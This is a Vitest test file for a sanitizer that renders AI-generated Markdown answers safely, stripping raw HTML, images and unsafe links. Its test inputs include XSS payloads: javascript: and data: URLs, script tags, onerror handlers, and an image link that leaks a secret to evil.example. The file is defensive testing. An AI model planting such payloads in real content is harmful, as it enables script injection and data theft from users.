import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { ANSWER_LINK_REL, safeLinkUrl } from "@/lib/markdown-safety";
import { AnswerMarkdown } from "@/components/app/ask/answer-markdown";

/**
 * An Ask answer is model output built from people's notes, so it's untrusted
 * Markdown. These pin what may come out of it: Markdown structure yes; raw HTML,
 * images and unsafe links never.
 */

const render = (md: string) => renderToStaticMarkup(createElement(AnswerMarkdown, null, md));

describe("safeLinkUrl", () => {
  it.each([
    ["https://example.com/a?b=1", "https://example.com/a?b=1"],
    ["http://example.com", "http://example.com/"],
    ["  https://example.com  ", "https://example.com/"],
    ["mailto:me@example.com", "mailto:me@example.com"],
  ])("keeps %s", (raw, out) => {
    expect(safeLinkUrl(raw)).toBe(out);
  });

  it.each([
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    " javascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "/app/settings",
    "//evil.example/x",
    "#top",
    "https://",
    "not a url",
    "",
  ])("refuses %j", (raw) => {
    expect(safeLinkUrl(raw)).toBeNull();
  });

  it("refuses non-strings", () => {
    expect(safeLinkUrl(undefined)).toBeNull();
    expect(safeLinkUrl(null)).toBeNull();
  });
});

describe("AnswerMarkdown", () => {
  it("renders Markdown structure: headings (shifted down), lists, bold, code", () => {
    const html = render("# Title\n## Sub\n- **one**\n- two\n\n1. first\n\nSome `code` here.");
    expect(html).toContain("<h3");
    expect(html).toContain("<h4");
    expect(html).not.toMatch(/<h1|<h2/);
    expect(html).toMatch(/<ul[^>]*>\s*<li[^>]*><strong[^>]*>one<\/strong>/);
    expect(html).toContain("<ol");
    expect(html).toMatch(/<code[^>]*>code<\/code>/);
    expect(html).not.toContain("## Sub");
  });

  it("renders GFM tables inside a box that scrolls sideways", () => {
    const html = render("| Month | Spent |\n|---|---:|\n| Sep | $42.00 |\n| Oct | $12.50 |");
    expect(html).toMatch(/<div class="[^"]*overflow-x-auto[^"]*"><table/);
    expect(html).toContain("<th");
    expect(html).toMatch(/<td[^>]*>\$12\.50<\/td>/);
  });

  it("drops raw HTML — no tags, no scripts, no handlers", () => {
    const html = render(
      'Hi <script>alert(1)</script><img src=x onerror="alert(2)"><b onclick="x()">bold</b>\n\n<div>block</div>',
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("<b");
    expect(html).not.toContain("<div>block");
  });

  it("drops Markdown images — they would load (and leak) without a click", () => {
    const html = render("Look ![chart](https://evil.example/pixel.png?d=secret) here");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("opens safe links in a new tab with noopener noreferrer nofollow", () => {
    const html = render("See [the docs](https://example.com/docs).");
    expect(html).toContain('href="https://example.com/docs"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain(`rel="${ANSWER_LINK_REL}"`);
    expect(ANSWER_LINK_REL).toBe("noopener noreferrer nofollow");
  });

  it("keeps an unsafe link's text but not the link", () => {
    for (const href of ["javascript:alert(1)", "data:text/html,hi", "/app/settings", "vbscript:x"]) {
      const html = render(`[click me](${href})`);
      expect(html, href).toContain("click me");
      expect(html, href).not.toContain("<a");
      expect(html, href).not.toContain("javascript:");
      expect(html, href).not.toContain("data:");
    }
  });

  it("doesn't autolink an unsafe bare URL either", () => {
    const html = render("www.example.com and javascript:alert(1)");
    expect(html).not.toContain('href="javascript');
  });

  it("puts no hast `node` attribute on the DOM", () => {
    expect(render("**a** [b](https://example.com)")).not.toContain("node=");
  });
});
